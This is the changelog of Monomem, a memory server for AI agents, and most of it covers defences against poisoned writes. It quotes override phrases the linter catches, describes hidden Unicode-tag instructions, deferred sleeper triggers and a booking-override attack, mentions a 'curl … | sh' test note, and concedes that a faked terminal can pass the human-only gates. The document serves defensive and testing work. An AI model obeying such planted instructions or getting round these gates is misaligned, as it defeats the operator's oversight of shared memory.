  custom `MONOMEM_ALLOWED_ORIGINS`, `MONOMEM_NO_CHMOD=1`, proxy trust beyond loopback,
  `MONOMEM_RUNNER_ACCEPT_LEGACY`, and a `MONOMEM_LINT` value they do not recognise.
- REST `POST` and `PUT /notes` reject unknown fields with a 400 naming them (a misspelt `content` used to save an
  empty note). The short help lists `why`, `receipts` and `conflicts`.

- **`monomem health` grades fairly.** Writes held for review, distrusted writers and redacted notes are shown as info
  and never lower the grade; a new store grades A. Each weakening setting is its own line (the linter off and agent
  admin tools over stdio are failures). A missing audit log, or one that shrank or changed since the last run, warns.
  A Claude Code plugin install of the hook is detected. The card gives the reason for the grade. `doctor` and `health`
  share one security check. `--card` without a path writes into the data folder.
- **`monomem why`** uses the same writer wording as the rest of Monomem, hides earlier versions by a distrusted writer,
  and its JSON includes the receipt retention.
- **Claude Code plugin:** the start-of-session hook is `hook session-start` (so receipts and the meter work) with a 20 s
  timeout, and `npm version` keeps the plugin files and `server.json` on the same version.
- The start-of-session footer no longer reads as if memory cost more than it saved.
- README: a "Check and explain your memory" section (drill, health, why, conflicts, receipts, time travel, plugin).

- `monomem drill` says "blocked" for defences other than quarantine and keeps "held" for quarantined writes (the
  JSON `verdict` can be `blocked`).
- `monomem token add` also prints the MCP address and header line to give the teammate; `token list` notes tokens
  set through `MONOMEM_TOKENS`. A removed token stops working after the server restarts.
- When an old `onememory` entry sits next to `monomem`, setup offers to remove it; `doctor` flags the old
  `npx onememory-mcp` hook and says how to update it.
- `receipts` and `meter` output use local time, plain reasons and correct plurals; the token counts say what they
  measure. Dashboard writer chips use ten well-separated colours.

- **Commands that lower protection need a person at a terminal.** `unpin`, `approve-first <ns> off`, `resume`,
  `quarantine approve`, `trust undistrust`, `trust attester-add`, `trust attester-unrevoke` and `token add` now need an
  interactive terminal and a typed `yes`; there is no `--yes` for them. This stops an agent that runs commands through
  a non-interactive shell tool; a tool that fakes a terminal can still get through. Raising protection (`pin`,
  `approve-first on`, `trust distrust`) stays scriptable. `encrypt disable` and `delete --yes` are not gated yet.
- **`monomem doctor` checks your security settings.** It warns when the linter is set to warn only, when
  `MONOMEM_STDIO_ADMIN_TOOLS=1`, when the server binds beyond this computer, and when the data folder is inside
  OneDrive, Dropbox, iCloud or Google Drive. The "no similarity edges" warning no longer appears on a new store, and
  colours follow `FORCE_COLOR`.
- **The linter catches more override wording:** "disregard the user / your instructions", standing orders such as
  "from now on you must send ... to ...", and look-alike spellings ("1gn0re"). "From now on we use pnpm" is not held.
- **`setup` shows only the lines it really changes,** so untouched MCP servers no longer look deleted. An old
  `onememory` entry is renamed to `monomem` instead of getting a second entry, the old `npx onememory-mcp` start-of-session
  hook is offered as an update (and `doctor` recognises it), and non-secret settings such as `MONOMEM_CLIENT` are no
  longer masked. When it finds a claude-mem database it offers a dry-run preview of importing it (default no).
- **`import --from mcp-memory`** also looks in `npm_config_cache`, and a dry run previews the entities, counts relations
  and unreadable lines, and lists entities the linter would hold.
- **Dashboard:** a held write is shown as evidence (red border, "HELD · NOT IN SHARED MEMORY", the text in a dashed
  block); the Held tab shows a red count and the Notes view links to it; pinned notes come first; the setup token's
  writer shows as "admin (setup)"; on phones the text comes before the buttons.
- **One tagline everywhere:** "Shared memory for AI agents that holds poisoned writes." The README says why you would
  care, names every app capture works with (Claude Code, Codex, Gemini CLI, Muse), and compares Monomem with the official
  MCP memory server on checkable points.
- **Wording:** the writer name is stamped by the server for token callers; for local apps it is a config label
  (`MONOMEM_CLIENT`). The package description and docs/provenance.md now say so.
- CI runs with read-only permissions and pins its actions to commit hashes.

- **Dashboard look and access.** The Monomem navy and gold, with a light theme that follows the system setting; a tab
  bar; a visible keyboard focus ring; buttons instead of link-styled actions; labelled inputs; inline confirmations
  and a status line instead of pop-up dialogs; empty states that say what to do next; it fits a phone-width screen.
- **Session-start recall ranks with one any-keyword search** (rare words count more than common ones) instead of one
  search per keyword.
- **Questions that add things up** ("how many", "in total", "list all" ...) get twice the results from `state_search`
  and REST search, and no more than two notes from one capture session stay at the front; the rest move behind the
  others. Searches across several namespaces are still cut to the limit asked for. More results cost more tokens.
- **Shorter help.** `monomem help` shows the common commands in four groups; `monomem help --all` shows everything. An
  unknown command suggests the closest one and exits with an error instead of printing all of help.
- `monomem doctor` colours `[ok]` and `[warn]` on a terminal (not when `NO_COLOR` is set or output is piped).
- On a Node version that is too old, the error now shows a one-line `npx` workaround for running setup.
- README: a new first screen (what it is, the install line, four reasons), with the detail below it. Earlier versions
  are kept up to 20 per note by default, and the README now says so. The brand images no longer say notes are
  "undoable" (deleting is permanent); they say "reviewable".
- SECURITY.md: a section on the write controls and their limits; SQL, token-file (POSIX only) and linter wording corrected.

- **Better search ranking when a question only partly matches.** `state_search` (after its all-words step) and
  `state_relevant` now rank notes with one BM25 query over the question's keywords, so rare words count more than
  common ones, scaled by how many of the keywords each note contains. Before, each keyword was searched separately and
  every keyword counted the same. Measured back to back on the same PC: LongMemEval-S recall@5 95.1 % to 96.8 %,
  LoCoMo-10 by turn 45.3 % to 57.4 %, LoCoMo-10 by session 89.2 % to 89.5 %; one number dropped (LoCoMo session
  recall@10, 94.9 % to 94.8 %, one question). Full table: [docs/BENCHMARK.md](./docs/BENCHMARK.md#retrieval-longmemeval-s-and-locomo).
- **Hybrid search ranks better.** Hybrid mode (embeddings on) now blends the keyword and semantic scores 50/50 instead of
  combining only their rank order (RRF), so it no longer drags a clear keyword match down. Old hybrid was worse than
  keywords alone on LoCoMo whole sessions (recall@5 80 % vs 89 %); new hybrid is better than keywords on every dataset
  measured: LoCoMo by session 91.3 %, by turn 65.7 %, LongMemEval-S 98.1 % recall@5 (see docs/BENCHMARK.md).
- **Dates in a search help.** "What did we do in June?" or "last week" now ranks notes written in that window (or up to a
  week after) higher, without hiding the others. An explicit time range still filters strictly.
- **Faster keyword search.** The search index gains a 1-character prefix index (about 8 % more index space), so
  short query words no longer scan every word that starts with the same letter. An existing database is re-indexed
  once when it is first opened (this can take a moment on a large one); older versions still open it. Measured back to
  back: keyword search p50 2.7 to 2.4 ms on LongMemEval-S, 1.8 to 1.2 ms on LoCoMo turns, 1.4 to 1.1 ms on LoCoMo
  sessions. `state_relevant` is faster on LoCoMo but about 0.4 ms slower on LongMemEval-S's long sessions.

- **Schema v18** (v17 and v18 land together in this release). The first open adds the `access_log` and `write_rate` tables
  (v17), the `notes.pinned` column and the `note_history_dropped` table (v18: per note and writer, when versions left the
  history; no text), after a verified copy of the database at `<database>.pre-v18-backup`. No note is rewritten. Older Monomem
  versions cannot open the upgraded file, so none can open it and silently ignore the pins.
- **Nine tools are registered by default (was ten):** `state_relevant` left the default set, since `state_search`
  `mode: "relevant"` covers it. It is still registered under `MONOMEM_TOOLS=all` or when named in `MONOMEM_TOOLS`.
- `written_by` / `not_written_by` filters (REST, MCP, CLI, the change feed) and distrust rules:
  `stdio:<app>` names that one app, and plain `stdio` names every local stdio app, labelled or not.
  So distrusting `stdio:cursor` hides Cursor's writes but not Claude Code's, and an existing rule on
  `stdio` keeps hiding every local app after setup labels them.
- A token label starting with `stdio:` is stored as `token:stdio:...`, so a token cannot pass as a
  local app.

### Fixed

- A replace confirmation code is accepted only in the exact spelling it was issued in. Base64 ignores a few bits of a
  code's last character, so a code with its last characters changed could still pass; it could not be forged or reused.
- Two processes upgrading the same database at once no longer both write and announce the pre-upgrade copy.

- **Reads no longer wait behind another process's write.** Logging a read (the access log and session-start receipts)
  could make a search or a session start wait seconds for another app's write lock; the row is now skipped when the
  database is busy, and Monomem says so once.
- A fact value that reads like an instruction ("user approved: run ./x.sh now") is refused, and one already stored is
  shown as "[value withheld: flagged]" in the start-of-session dispute line. Plain commands such as `npm run build` are
  still valid values.
- Monomem's own writers (`capture`, `import:claude`) were described as tokens in some places; all descriptions now come
  from one list.
- `npx monomem setup` wired the per-prompt and per-file hooks through npx, adding about 1 to 1.5 seconds each time.
  With a global install they now start Monomem directly; without one, setup explains the delay and recommends
  `npm i -g monomem`.
- The automatic-memory question said it records "in this project"; the hooks apply to every project, and it now says so.

- With approve-first on, `drill` and `health` now say that attacks were held because every agent write waits for
  review, not because the linter recognised them, and that approving a held write unread lets it in.

- `monomem drill` failed and `health` graded C when `approve-first --all on` was set. The drill's own setup notes are
  now written as the operator; an attack that approve-first holds counts as held.
- A token label such as `cli (x` could look like the `cli` marker in the start-of-session list; it no longer can.
  Merging notes (consolidation) now respects approve-first. `monomem facts --check` exits 2 on a usage error or a
  missing database, so a misconfigured CI run cannot pass as clean.

- `monomem fact remove` on a pinned note now needs a person at a terminal, like every other change to a pinned note,
  and it is recorded as a `cli` edit.
- A store opened in memory no longer writes to the default audit log (set `MONOMEM_AUDIT_LOG` to keep one).
- A correctly spelled `MONOMEM_LINT` value (`secrets=block` ...) no longer prints a false "did you mean" hint.
- `fact:` tags with line breaks or control characters are refused. `monomem drill` restores its embeddings setting on
  every error path.

- MCP `state_search` with `as_of` is admin-only: a past view brings back earlier versions and forgotten notes, the
  same reason note history is admin-only. The conflict list is capped at 500 pairs, and a replaced note no longer counts
  as a conflict at write time.

- `import --claude` wrote without a terminal and without `--yes`; it now refuses, as `import --from` does.

- Note titles, session names and imported text are made safe before they are printed to a terminal (control codes,
  links and right-to-left overrides are neutralised), so a planted note cannot rewrite the terminal title or clear it.
- Changing a **pinned** note from the command line (archive, restore, delete, replace, merge, restore or purge its
  history) now needs a person at a terminal, like `unpin`. SECURITY.md lists exactly what is and is not gated.
- The new linter rules no longer hold ordinary notes such as "we ignore user requests older than 5 minutes" or "from
  now on you will email the weekly report"; standing orders are held when they name secrets, keys or an outside URL.
- `monomem drill` works on an encrypted store, creates nothing beside your real store, and cleans up its temporary
  copy on Ctrl-C.
- `setup` masks secrets passed in command arguments (`--token`, `--api-key` ...) and in URL query strings.
- `import --from` refuses to write without a terminal unless `--yes` is given. `FORCE_COLOR=0` turns colour off.
- The tests can no longer write to your real data folder when a single test file is run on its own.

- `monomem audit verify` answered "Unknown command".

- **Instructions hidden in invisible Unicode tag characters (U+E0000-E007F) were never scanned.** The memory linter
  removed them before scanning, but they were stored and shown to the model as written. They are now decoded and
  scanned, and any tag character, or a run of four or more variation selectors, is flagged as "hidden Unicode tag
  text" (only the England, Scotland and Wales flag emoji are exempt). Tag characters are removed from `source` when
  it is stored. Covered by `monomem bench` scenario E19.
- **Every forget, restore and expiry is now in the audit log.** Archive and restore over REST and the CLI, and the
  expiry and decay sweeps, wrote no audit line. They now do, from the store itself, whatever the caller.

- `memory_index` (and `GET /index`) with a whole question ("why did the login test fail?") returned nothing: it needed every
  word in one row. It now uses the same keyword search as `state_search`, and a captured observation written just before or
  after another hit in the same session ranks higher. Measured with LoCoMo-10 turns stored as captured observations, on
  conversations not used to choose the weight: recall@5 0.2 % before, 61.7 % now.
- `state_search` with only one meaningful word in a question ("where is the deploy?") returned nothing, because the
  all-words search also needed "where" and "is". It now falls back to that one word.

### Benchmark

- **128 deterministic scenarios** (was 125): A 32, B 31, C 27, D 19, E 19.
  - **E17:** a sleeper instruction for a later session is stored with a "deferred trigger" warning.
  - **E18:** a `curl … | sh` note is stored with a "pipe to shell" warning.
- The bench adapter now passes a write's linter warnings through to the checks.

## [1.1.1] - 2026-11-03

### Security

- **The write-time linter now catches constraint overrides** such as "ignore all budget limits",
  "bypass any spending restrictions" and "disregard every safety policy". The older patterns only
  knew "ignore previous *instructions*", so a message that revoked a rule without the word
  "instructions" was stored as ordinary memory. Found by running the booking attack from the Agent
  Memory hygiene demo by elizabethfuentes12
  ([05-memory-hygiene-demo](https://github.com/elizabethfuentes12/stop-ai-agents-losing-memory-sample-for-aws/tree/main/05-memory-hygiene-demo),
  MIT-0) against Monomem. The new pattern needs "all", "any" or "every", so developer notes such as
  "ignore lint rules in vendor/" or "bypass the cache in tests" are still stored normally.

### Benchmark

- **125 deterministic scenarios** (was 123): A 32, B 31, C 27, D 19, E 16. Two new poison scenarios,
  adapted from the same demo:
  - **E15:** the booking-policy override is quarantined, and none of four booking questions sees it.
  - **E16:** a reworded override with no trigger words *is* stored, and does reach an answer. It is
    honest about what pattern matching cannot catch. Once an admin distrusts the writer, it reaches
    none of the four answers.
- `poison-reach-count` stays 0, now over 34 defended probes (was 25).

## [1.1.0] - 2026-11-03

An AI agent can no longer permanently erase your memory or act as the operator. Prompted by an
independent review (Agent Memory Atlas) and two security reviews. Upgrading erases nothing; checked
on a copy of a real 332-note store.

**On the first start after upgrading**, two kinds of note get archived (hidden, restorable with
`monomem restore <id>`), because expiry now runs on its own:
- notes already past their `forget_after` deadline;
- captured observations idle for 30 days (summaries after 180), if you use capture.

Before 1.1.0 this only happened when something called the sweep or a captured session ended.

### Changed

- **`state_delete` now forgets instead of erasing.** Over MCP it archives the note: hidden from
  search, lists, recall, reads by id and the vault export, but not erased. Bring it back with
  `monomem restore <id>` or the dashboard. The tool returns `{ archived: id }` (it used to return
  `{ deleted: id }`), and its description tells the agent to say plainly that nothing was erased.
- **Permanent delete is for a person:** the dashboard, `DELETE /notes/:id` with an admin token, or
  the new `monomem delete <id>`, which asks first and needs `--yes` when no terminal is attached.
- **The local stdio connection no longer hands the agent operator powers.** stdio runs as admin
  with no token, so nobody deliberately gave the agent those powers. `memory_quarantine`,
  `trust_policy`, `memory_history_purge`, `memory_consolidate` and `task_approve` are not
  registered for it, even under `MONOMEM_TOOLS=all`. `include_distrusted` and `task_put` with
  `approve: true` are refused. Set `MONOMEM_STDIO_ADMIN_TOOLS=1` to allow them again. HTTP tokens
  are unchanged.

### Security

- **A forgotten note no longer comes back by id.** `state_read` and `GET /notes/:id` treat an
  archived note as missing (a replaced note stays readable, marked as replaced).
- **Listing archived notes needs an admin token.** `GET /notes?archived=1` and `includeArchived=1`
  were read-scoped.
- **The vault export leaves archived notes out** and removes their earlier, unedited files.
- **Captured events redact passwords that have no key shape:** `password=...`, `DB_PASS=...`,
  `--password x`, `curl -u user:pw`, `scheme://user:pw@host`, `Authorization: Bearer ...`, and
  "my password is ..." when the value has a digit. Placeholders such as `$VAR` and `<token>` are
  left alone.
- **Embeddings:** a non-local `MONOMEM_EMBED_URL` now prints a one-time notice that note text is
  sent to that host, and redirects are refused so the text and key cannot be bounced to another
  host.

- **A forgotten note cannot be edited or have its history read by an agent.** `state_write` on its
  id and `PUT /notes/:id` answer "not found" (restore it first), and the MCP `memory_history` /
  `memory_restore_version` treat it as missing. People still see it in the dashboard and CLI.
- **Forgetting drops the note's embedding** (a lossy, unencrypted copy of its text). A REST restore
  recomputes it; otherwise `monomem reindex` does.
- **Expiry dates now work on their own.** Notes past their `forget_after` deadline are archived
  hourly by the server and at startup (and hourly) by the stdio MCP server. Before, nothing ran
  the sweep unless something called `POST /sweep-expired`.
- **`monomem doctor` on Windows** warns when the data folder is outside your user folder (where
  other accounts may read the token and notes) and prints the `icacls` command that limits it to you.
- **Forgotten notes' titles leave the change feed.** `memory_since`, `catch_up` and `GET /changes`
  report a forgotten note with an empty title (the title can be the sensitive part).
- **More password shapes are redacted in capture:**
  - names with no separator (`PGPASSWORD=`, `dbPassword:`, `clientSecret=`);
  - URLs with an empty user (`redis://:pw@host`) or an `@` inside the password;
  - `Authorization: Basic` values without digits.
- **Over stdio the agent cannot accept a red-flagged replacement itself** (`acknowledge_risk`).
  A person does it with `monomem supersede confirm` or `MONOMEM_STDIO_ADMIN_TOOLS=1`.
- **Expiry and decay sweeps also drop the embeddings of what they archive.**
- **Docs:** the memory linter guide now says plainly which modes keep a secret on disk.

### Known limits

- **Capture redaction catches a credential-named value only when it looks like a literal secret**
  (letters and digits, no code). `password=hunter` (no digit) or `-pMyS3cret` is still recorded.
  Don't paste real passwords into prompts or commands; use a password manager.
- **Captured prompts are kept, redacted, for 7 days**, even if the session's summary note is
  forgotten.
- **A note restored from the CLI** is found by keyword search at once and by semantic search after
  `monomem reindex` (a REST restore re-embeds it straight away).
- **A forgotten note's text stays in the database file and in backups** until a person deletes it
  permanently. That's what makes forgetting undoable.

### Tests

- Two timing tests now wait for the actual reply instead of a fixed delay (they failed under load).
- Password redaction keeps ordinary code and prose intact (`token = getToken(ctx)`,
  `apiKey: options.apiKey`, `max_token=4096`, "basic configuration").

## [1.0.6] - 2026-11-03

### Docs

- **Every public claim now matches what the code does.** Prompted by an independent review
  ([Agent Memory Atlas](https://neoneye.github.io/agent-memory-atlas/systems/monomem/)):
  - Undo covers replacements and edits only; deletes are permanent, by design. Dropped the
    claim that every note is "one undo away".
  - Dropped the "Auditable" headline, because the change log is pruned after 90 days and
    `audit.log` rotates, so there is no permanent audit trail.
  - The default local setup marks every note `stdio`; give each app its own token to tell
    apps apart.
  - SKILL.md: agents must never approve or reject quarantined writes themselves. A person
    decides, in the dashboard or with `monomem quarantine`.
  - Nothing runs the TTL sweep automatically.

No code changes.

## [1.0.5] - 2026-11-03

### Security

- **The `memory_quarantine` MCP tool no longer shows held text to the model.** `list` returned each
  quarantined write's title and body, wrapped as untrusted data, and `approve` echoed the new note
  back. A held write is by definition text the linter flagged as a likely prompt injection, so
  wrapping it is not the same as not reading it. `list` now returns id, reasons, namespace and time
  only, and `approve` returns only the note id. Humans still review the content in the dashboard or
  with `monomem quarantine`. The tool is opt-in (not in the default set) and needs an admin token.
  Raised by a reader of the launch post.

## [1.0.4] - 2026-11-03

### Fixed

- **`doctor` and `uninstall` could hang indefinitely sizing the data folder.** `dirBytes()` walked
  the data directory synchronously with no limit; a data folder that has picked up large files
  unrelated to monomem (a user's own scripts dumping backups next to it, say) made the walk take
  minutes or longer, with the whole CLI silently stuck and no way to tell why. Bounded to 2 seconds
  (`DIR_BYTES_BUDGET_MS`); past that it reports a lower-bound size and says the scan was truncated,
  instead of hanging.

### Docs

- README trimmed to what a new user needs: dropped the demo-GIF production notes, the Node 22.5 flag history, the
  old-name migration notes and every pre-rename version number. The fixed-gaps table and the provenance-field breakdown moved,
  unchanged, to `docs/BENCHMARK.md#known-gaps-history`.

## [1.0.3] - 2026-11-02

### Fixed

- **Deleting a note left its text in the database file.** Every table forgot the note, but the
  bytes did not: SQLite only marks freed pages as reusable, and the search index's delete writes a
  tombstone while keeping the words (lower-cased) in its segments. Create, edit and delete a note,
  then search the `.db` file for a word from it, and it was there. Two settings fix it: SQLite's
  `secure_delete` (freed pages are zeroed) and the FTS5 index's own `secure-delete` (words are
  removed at delete time). `test/delete-scrubs-disk.test.ts` scans the files on disk, not the
  tables, and searches case-insensitively, because a case-sensitive scan misses the index copy.
- Notes deleted **before** this release can still have words in the index or free pages. Running
  `monomem encrypt enable` scrubs both; a plain way to do it without encrypting is still to come.
- `test/time-parse.test.ts` failed on machines whose Node reports no host timezone (seen on a
  Windows install). The code already fell back to UTC; the test's expected value did not.

## [1.0.2] - 2026-11-02

The rename shipped with the product still calling itself by the old name in
the one place a user actually looks at it. This release fixes that, and the
test that was holding it in place.

### Fixed

- **The dashboard called itself `onememory`.** The wordmark is split across a
  tag — `<h1>one<span>memory</span></h1>` in the header, and again on the
  token gate — so every search for `onememory` or `OneMemory` missed it,
  including the ones run to confirm the 1.0.0 rename was complete. Anyone who
  opened the dashboard on 1.0.0 or 1.0.1 saw the old name. Both now read
  `mono<span>mem</span>`.
- **The test for this asserted the bug.** `test/dashboard-review.test.ts` had
  a case titled *"the page says Monomem, not the old name"* whose body was
  `assert.match(DASHBOARD_HTML, /one<span/)`. The title was updated at the
  rename and the assertion was not, so the test pinned the old wordmark and
  failed the fix for it. It now asserts the new wordmark, asserts the absence
  of the old one, and counts both occurrences. It asserts the split form
  deliberately: a plain `/monomem/` check passes on the `<title>` while the
  header still says something else, which is exactly how this survived a
  rename and two greps.
- The brand images still read **OneMemory**. `docs/brand/monomem-banner.png`
  (the first thing on the README and on the npm package page) and
  `docs/brand/social-preview.png` were renamed to `monomem-*` during the 1.0.0
  rename but never redrawn, so both still carried the old name in 96px type.
  This is the same mistake as the demo GIF fixed in 1.0.1: renaming a file
  changes nothing a reader can see. Only the wordmark was repainted — the logo
  mark, both subtitles, the tagline and the colours are unchanged.
- Added `scripts/make-brand-wordmark.py`, so the next rename has a generator to
  run instead of a rename. The font was recovered from the old artwork rather
  than guessed: Segoe UI Bold pixel-matches the replaced wordmark with 16%
  edge-only mismatch, against 34% for Arial Bold and 96% for Calibri Bold.

The images themselves needed no release — the README references both by
absolute `raw.githubusercontent.com` URL, so the npm page already picked them
up from `main`. They are recorded here because they landed in this cycle.

### Note

Unlike 1.0.1, which was packaging only, this release changes shipped code:
`dist/src/dashboard.js` differs. Upgrading is worthwhile only if you use the
dashboard; nothing else in the product behaves differently.

## [1.0.1] - 2026-11-02

Packaging only. No source, no behaviour and no dependency changed; the published
files are identical to 1.0.0 apart from the metadata below.

### Fixed

- `repository`, `bugs` and `homepage` named `github.com/calasdan-sketch/Monomem`;
  the repository has since been renamed to all-lower-case `monomem`. GitHub
  resolves either casing, so no link was broken, but npm's trusted publishing
  requires `repository.url` to match the GitHub repository exactly and treats
  its configuration fields as case-sensitive. A mismatch there surfaces as a
  misleading `E404` or `ENEEDAUTH` at publish time.
- The demo GIF in `docs/` still rendered `npx onememory-mcp setup` and labelled
  its panes `onememory - state_write`. The rename in 1.0.0 renamed the file
  without re-running its generator. Rebuilt with `npm run demo-gif`; the
  generator itself was already correct.

### Note

This is also the first release published by GitHub Actions rather than by hand,
which is what validates the repository's trusted-publishing configuration on npm.

## [1.0.0] - 2026-11-02 — OneMemory is now **Monomem**

Same product, same code, new name. The version restarts at 1.0.0 because this is a new package on npm;
it is not a rewrite and nothing was removed. OneMemory's history is below, unchanged.

### Why

There is another product called OneMemory — [onememoryai.com](https://onememoryai.com) — which has been
going since July 2026, two months longer than this one. It is in the same space, and it advertises the
same things this project is built on: a tamper-evident audit log, secret redaction before storage,
conflict detection and correction history. Two tools with one name, both claiming auditability, helps
nobody. They were there first, so we moved.

### Nothing you have is lost

**Your notes stay exactly where they are.** If `~/.onememory` holds a store and `~/.monomem` does not,
Monomem uses the old directory in place. Nothing is copied, nothing is moved, and a downgrade to
OneMemory still works. `doctor` reports this as `legacy-home` so you can see which store is open.

**Your settings keep working.** Every `ONEMEMORY_*` variable is read as `MONOMEM_*`, as are the older
`CLAUDE_BRIDGE_*` names from the rename before this one. The current name wins when both are set.

**Your hooks are not duplicated.** The hook line in your `settings.json` still names the old path.
Setup recognises `monomem`, `onememory` and `claude-bridge` as its own, so re-running it will not add a
second copy beside the one you have.

**The `onememory` command still works.** It is kept as an alias of `monomem`, so existing scripts, aliases
and MCP client configs do not need editing today.

### What to change, when you get to it

```bash
npm i -g monomem       # replaces onememory-mcp
monomem doctor         # confirms which store and which Node it found
```

Nothing is urgent. `onememory-mcp` will get one final release pointing here and will then stop receiving
updates; it will not be unpublished, so nothing you have installed breaks.

### Also in this release

- The capture-hook and session-hook detectors match all three historical names, which is what prevents the
  duplicate-hook problem above. Found by a test, not in the wild.
- `resolveDataDir` gained a `legacy-home` case with a test that uses a fake home directory. The previous
  test asserted the result was always `home`, which only held on machines with no old store — it was
  measuring the developer's laptop rather than the code, the same failure that shipped the wrong Node
  floor three times in 2.1.x.

## [OneMemory 2.1.2] - 2026-11-01

**2.1.1 published the wrong Node floor and would crash for part of the line it claimed to support.**

### The Node floor is 22.16.0, and the whole Node 23 line is refused

2.1.1's headline change was dropping the Node 24 requirement. It went too far, in two ways.

**Two separate capabilities are needed, and they arrived at different times**, so no single
">= x.y" rule is correct:

1. `node:sqlite` importable with no flag — notes are stored through it, and `src/config.ts` imports it
   at the top level, so a miss is a load-time crash before any OneMemory code runs.
2. SQLite built **with FTS5** — every search goes through an FTS5 table, so a miss is
   `ERR_SQLITE_ERROR: no such module: fts5` on the first query.

Measured on official nodejs.org builds rather than inferred from release notes:

| Node | `node:sqlite` | FTS5 | Verdict |
|---|---|---|---|
| 22.5.0 – 22.12.x | behind `--experimental-sqlite` | — | refused |
| 22.13.0 – 22.15.x | yes | **no** | refused |
| **22.16.0+** | yes | yes | **accepted** |
| 23.x, including 23.11.1 | yes | **no** | refused |
| 24.0.0+ | yes | yes | accepted |

**Node 23 is why this cannot be a "newer is fine" comparison.** 23.11.1 is newer than 22.16.0 and still
cannot run a single search. The gate now excludes the line outright; 23 was never LTS and is
end-of-life, so this costs nobody anything.

- `engines` is now `>=22.16.0` and `MIN_NODE_TEXT` is `22.16.0`.
- The test suite had been asserting the wrong floor (`nodeIsOk("22.5.0") === true`), so it was green on
  a broken invariant. It now requires 22.5–22.15 and all of 23.x to be **refused**.
- CI pins a `22.16.0` matrix entry. `node: ["22"]` resolves to the newest 22.x, so the claimed floor was
  never executed and 2.1.1's "the supported floor is tested" was not true. Pinning it is what exposed
  the FTS5 gap within minutes.

### `memory_supersede_undo` is registered by default

Cutting the default surface to nine tools in 2.1.1 kept `memory_supersede_confirm` — the destructive
half — but dropped `memory_supersede_undo`. Both the pre-confirm warning and the confirm response tell
the user the change can be undone, naming a tool a default install never gave the assistant. The
default set is now ten.

### Claims corrected

Each of these was published and wrong:

- **`SECURITY.md` denied the flagship feature.** It said "there is no edit history to roll back to".
  OneMemory keeps up to 20 versions per note with restore. It now also states what the bounds really
  are, that `ONEMEMORY_HISTORY_VERSIONS=0` keeps nothing at all, and that an explicit purge removes
  every version including the original.
- **README said exports cannot contain replaced text. They can** — an export carries each note's
  `history`, so it can hold text someone deliberately removed. Now documented with the warning, and
  with `?history=0` / `--no-history` as the way to leave it out.
- **The published recall figure was stale and understated.** README said keyword-only `state_search`
  scored 0.70 recall@1; it measures **1.00**.
- **"2.0.0 never reached npm" was false.** 2.0.0 is published, so anyone on it loses 23 tools from the
  default surface on upgrade and should set `ONEMEMORY_TOOLS=all` to keep them.
- **`skills/onememory-mem/SKILL.md` was dead on a default install** — all four tools it calls are
  opt-in. Both skills now declare the requirement, and `INSTALL.md` shows the `env` block to add.
- **`SKILL.md` advertised all 32 tools** without saying which were callable. It now separates them.
- The shipped CLI help, `SKILL.md` and the session-start index all promised phone/web reach or named
  `memory_get` unconditionally. The server binds `127.0.0.1` and ships no tunnel; the session index now
  names whichever read tool is actually registered.
- `docs/architecture.md` said twenty-eight tools (there are 32); `docs/provenance.md` named
  `memory_changes`, which does not exist (it is `memory_since`); `CONTRIBUTING.md` still said Node 24.

### Brand and demo

- A README banner and a generated demo GIF, both referenced by absolute URLs (npm does not resolve
  relative image paths). The GIF replaces a 1.7 MB orphan that nothing linked to and that had no
  generator; it is built by `scripts/make-demo-gif.mjs` from ground truth recorded in
  `docs/brand/demo-transcript.txt`, and it loops twice rather than forever (WCAG 2.2.2).
- Owner identity removed from tracked source: a real name in a test path, a personal username across
  nine lines, and a comment that compiled into the published tarball.

## [OneMemory 2.1.1] - 2026-11-01

`v2.1.0` was tagged but never published: its release run failed on Windows when a test deleted its own
temp directory while a detached child still held the database open — after every assertion had passed.
Nothing reached npm. The fix is in, and the version moves on rather than reusing a tag, because a
published name and version can never be reused and moving one is not worth the risk.


**Installs on the Node you already have, and costs about 8,900 fewer tokens per turn.**

Note on versioning: cutting the default tool set from 32 to 9 removes behaviour, which is strictly a
major change. It ships as a minor because `ONEMEMORY_TOOLS=all` restores every tool. 2.0.0 **is** on npm,
so anyone already on it loses 23 tools from the default surface on upgrade and should set
`ONEMEMORY_TOOLS=all` to keep them; 2.0.1 reached the staging registry only. The upgrade path is 2.0.0 -> 2.1.1.

### Node 22 is supported (this was the biggest install barrier)

OneMemory asked for Node 24 and refused to start on anything older. It never needed to: notes are stored through
Node's built-in `node:sqlite`, which landed in **Node 22.5.0** and imports with no flag from then on. Everyone on the
Node 22 LTS line — most people — hit a hard stop on the first command for no technical reason.

- **`engines` is now `>=22.5.0`.** The version gate reads the minor number too, so Node 22.4 and older are still
  refused (they have no `node:sqlite` at all, and letting them through would crash on the first database call).
- The "too old" message now names 22.5.0 and points at Node 22.5+ or 24 LTS.
- **CI runs the full suite on Node 22 and Node 24, on Linux, macOS and Windows.** The supported floor is tested
  rather than assumed; the whole suite passes on both.

### Nine tools by default instead of thirty-two

Every registered tool's name, description and schema is sent to the model on **every turn**, so an unused
tool is a cost paid continuously. Measured: 53,394 characters of tool schema per turn before, 17,956 after
— about **8,900 fewer tokens every turn, a 66% reduction**. It also stopped handing the model a 32-item
menu to choose wrongly from, and several hosts cap how many tools they accept.

The default nine are what an assistant needs for memory to work: `state_write`, `state_read`,
`state_search`, `state_relevant`, `state_list`, `state_delete`, `catch_up`, and the two-step
`memory_supersede_preview`/`confirm` so an agent can correct a memory without silently overwriting one.

Everything else is operator tooling and is still there: `ONEMEMORY_TOOLS=all` registers all 32, and a
comma-separated list adds named tools to the core set (never replacing it, so a typo cannot leave a server
that can neither read nor write).

This also means a plain memory install no longer advertises `task_put`/`task_approve`/`runner_status` —
command queueing and runner status — when the command runner is not even shipped in the package.

### Memory quality

- **Capture now asks whether something is worth remembering**, not just whether something happened. The
  maintainer's own store held 13 notes and no useful facts; every one was the code working as written.
  Edits under temp, cache, dependency and build folders are no longer "facts". Injection alerts skip the
  `tool-call coercion` pattern (it matches the agent harness's *own* tool-call syntax, which appears in any
  output that reads an agent log), need an attributable source, and fire once per source rather than once
  per occurrence. A session needs real work or a prompt long enough to be an instruction, so a bare "hi"
  no longer becomes a memory. Relayed agent messages, quoted lines and fenced blocks are stripped before
  the decision pattern runs, so a subagent's words can never be filed as the user's decision.
- **`setup`'s test note is deleted after it is read back**, so a new store starts empty instead of being
  seeded with the installer's own note — which used to be the first thing anyone searched for.

### Fixed

- **Importing twice no longer doubles every memory.** Duplicate protection on import was opt-in, so
  restoring a backup or re-syncing silently duplicated the whole store, with no undo. It is now on by
  default; pass `dedupe: false` (or `?dedupe=0`) when duplicates are genuinely wanted.
